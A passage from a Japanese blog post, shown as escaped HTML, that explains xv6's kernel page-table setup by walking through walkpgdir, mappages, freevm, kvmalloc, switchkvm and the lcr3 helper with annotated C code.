&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;PDXSHIFT&lt;/span&gt;        &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;      &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// offset of PDX in a linear address&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;続いて、&lt;code class=&quot;language-text&quot;&gt;if(*pde &amp;amp; PTE_P)&lt;/code&gt;の行では、取得したPDEのPresentビットを確認します。&lt;/p&gt;
&lt;p&gt;PDEのPresentビットはページが現在物理メモリにあるのか仮想メモリにあるのかを特定するために使用します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wiki.osdev.org/Paging&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Paging - OSDev Wiki&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ここでは、引数として受け取った仮想アドレスのPDEの有無を検証しているようです。&lt;/p&gt;
&lt;p&gt;初期状態では、&lt;code class=&quot;language-text&quot;&gt;memset&lt;/code&gt;関数によってPDは0に初期化されているため、以下の処理が呼び出されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;alloc &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgtab &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;pte_t&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;kalloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Make sure all those PTE_P bits are zero.&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgtab&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PGSIZE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// The permissions here are overly generous, but they can&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// be further restricted by the permissions in the page table&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// entries, if necessary.&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pde &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;V2P&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgtab&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; PTE_P &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; PTE_W &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; PTE_U&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;第3引数の&lt;code class=&quot;language-text&quot;&gt;alloc&lt;/code&gt;が1に設定されており、かつ仮想アドレスに対応するPDEが存在しない場合、ここで必要なPTが作成されます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kalloc&lt;/code&gt;関数の挙動は先ほども確認したので割愛します。&lt;/p&gt;
&lt;p&gt;ここで取得された1ページ分の領域は&lt;code class=&quot;language-text&quot;&gt;pgtab&lt;/code&gt;として参照されます。&lt;/p&gt;
&lt;p&gt;また、&lt;code class=&quot;language-text&quot;&gt;memset&lt;/code&gt;によってすべてのバイトが0に初期化されます。&lt;/p&gt;
&lt;p&gt;そして、PDEには物理アドレスに変換された&lt;code class=&quot;language-text&quot;&gt;pgtab&lt;/code&gt;のアドレスと、PDEに設定される権限が与えられます。&lt;/p&gt;
&lt;p&gt;最終的に&lt;code class=&quot;language-text&quot;&gt;walkpgdir&lt;/code&gt;関数の戻り値としては、引数で受け取った仮想アドレスに対応するPDEから解決されるPDTの参照となります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;pgtab&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;PTX&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;va&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;さて、&lt;code class=&quot;language-text&quot;&gt;walkpgdir&lt;/code&gt;関数が終了したので&lt;code class=&quot;language-text&quot;&gt;mappages&lt;/code&gt;関数に戻ります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pte &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;walkpgdir&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; a&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pte &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; PTE_P&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;remap&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pte &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; pa &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; perm &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; PTE_P&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; last&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  a &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; PGSIZE&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  pa &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; PGSIZE&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;pte&lt;/code&gt;にはこの仮想アドレスに対応するPTEの領域が確保されました。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;walkpgdir&lt;/code&gt;関数が実行された段階ではまだPTEはすべて0で初期化されたままですので、&lt;code class=&quot;language-text&quot;&gt;*pte = pa | perm | PTE_P;&lt;/code&gt;の行で物理アドレスとパーミッションの割り当てを行っています。&lt;/p&gt;
&lt;p&gt;これで、&lt;code class=&quot;language-text&quot;&gt;mappages&lt;/code&gt;関数によって仮想アドレスと物理アドレスを紐づけるPTEの作成が完了しました。&lt;/p&gt;
&lt;h3 id=&quot;freevm関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#freevm%E9%96%A2%E6%95%B0&quot; aria-label=&quot;freevm関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;freevm関数&lt;/h3&gt;
&lt;p&gt;最後に&lt;code class=&quot;language-text&quot;&gt;setupkvm&lt;/code&gt;関数に戻ります。&lt;/p&gt;
&lt;p&gt;以下のループは&lt;code class=&quot;language-text&quot;&gt;kmap&lt;/code&gt;配列の要素の数だけ繰り返されていました。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mappages&lt;/code&gt;関数によって、仮想アドレスと物理アドレスを紐づけるPDEとPTEが作成されました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;k &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; kmap&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; k &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;kmap&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;NELEM&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;kmap&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;mappages&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;virt&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phys_end &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phys_start&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
              &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phys_start&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;perm&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;freevm&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; pgdir&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;もしページテーブルの作成に失敗した場合、&lt;code class=&quot;language-text&quot;&gt;freevm&lt;/code&gt;関数の引数にここまで使用してきたPDTのページ&lt;code class=&quot;language-text&quot;&gt;pgdir&lt;/code&gt;が与えられメモリ領域が解放されます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;freevm&lt;/code&gt;関数も&lt;code class=&quot;language-text&quot;&gt;vm.c&lt;/code&gt;で定義された関数です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;freevm&lt;/code&gt;関数この時点では実行されないため、詳細は割愛します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Free a page table and all the physical memory pages&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// in the user part.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;freevm&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;pde_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uint i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;freevm: no pgdir&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;deallocuvm&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; KERNBASE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; NPDENTRIES&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; PTE_P&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; v &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;PTE_ADDR&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token function&quot;&gt;kfree&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;v&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;kfree&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;switchkvm関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#switchkvm%E9%96%A2%E6%95%B0&quot; aria-label=&quot;switchkvm関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;switchkvm関数&lt;/h2&gt;
&lt;p&gt;ここまでで&lt;code class=&quot;language-text&quot;&gt;setupkvm&lt;/code&gt;関数の処理は終了し、戻り値としてカーネルのPDTが返却されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Allocate one page table for the machine for the kernel address&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// space for scheduler processes.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;kvmalloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  kpgdir &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;setupkvm&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;switchkvm&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;この記事の前半で確認した通り、カーネルの参照するPDTの先頭アドレスは、x86ではCR3レジスタに格納されます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;switchkvm&lt;/code&gt;関数の挙動はシンプルで、CR3レジスタに作成したPDTの仮想アドレスを物理アドレスに変換して格納しています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Switch h/w page table register to the kernel-only page table,&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// for when no process is running.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;switchkvm&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;lcr3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;V2P&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;kpgdir&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;// switch to the kernel page table&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;lcr3&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;x86.h&lt;/code&gt;に定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;inline&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;lcr3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint val&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;asm&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;volatile&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;movl %0,%%cr3&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;r&quot;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;val&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これで&lt;code class=&quot;language-text&quot;&gt;kvmalloc&lt;/code&gt;関数によるカーネルのページテーブルの作成と切り替えが完了しました。&lt;/p&gt;
